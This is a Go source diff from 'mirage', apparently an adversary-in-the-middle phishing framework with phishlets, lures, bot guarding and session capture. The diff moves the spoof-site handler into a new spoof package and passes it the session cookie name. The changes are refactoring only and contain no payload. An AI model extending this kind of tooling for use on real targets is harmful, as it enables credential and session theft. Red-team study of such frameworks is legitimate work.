@@ -21,6 +21,7 @@ import (
 	"github.com/travisbale/mirage/internal/phishlet"
 	"github.com/travisbale/mirage/internal/proxy"
 	"github.com/travisbale/mirage/internal/puppet"
+	"github.com/travisbale/mirage/internal/spoof"
 	"github.com/travisbale/mirage/internal/store/sqlite"
 )
 
@@ -72,7 +73,7 @@ type initializer struct {
 	lureSvc       *aitm.LureService
 	blacklistSvc  *aitm.BlacklistService
 	puppetSvc     *aitm.PuppetService
-	spoofProxy    *proxy.SpoofSite
+	spoofer       *spoof.Server
 	wsHub         *proxy.WSHub
 }
 
@@ -222,7 +223,7 @@ func (ini *initializer) initServices() error {
 	ini.sessionStore = sqlite.NewSessionStore(ini.db)
 	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
-	ini.spoofProxy = proxy.NewSpoofSite(ini.cfg.SpoofURL, ini.logger)
+	ini.spoofer = spoof.NewServer(ini.cfg.SpoofURL, proxy.SessionCookieName, ini.logger)
 
 	var phishletSvc *aitm.PhishletService
 	if len(ini.dnsProviders) == 0 {
@@ -301,7 +302,7 @@ func (ini *initializer) initProxy(version string) error {
 		SecretHostname: ini.cfg.API.SecretHostname,
 		BotGuard:       ini.botGuardSvc,
 		Blacklist:      ini.blacklistSvc,
-		Spoof:          ini.spoofProxy,
+		Spoofer:        ini.spoofer,
 		PhishletSvc:    ini.phishletSvc,
 		SessionSvc:     ini.sessionSvc,
 		PuppetSvc:      ini.puppetSvc,
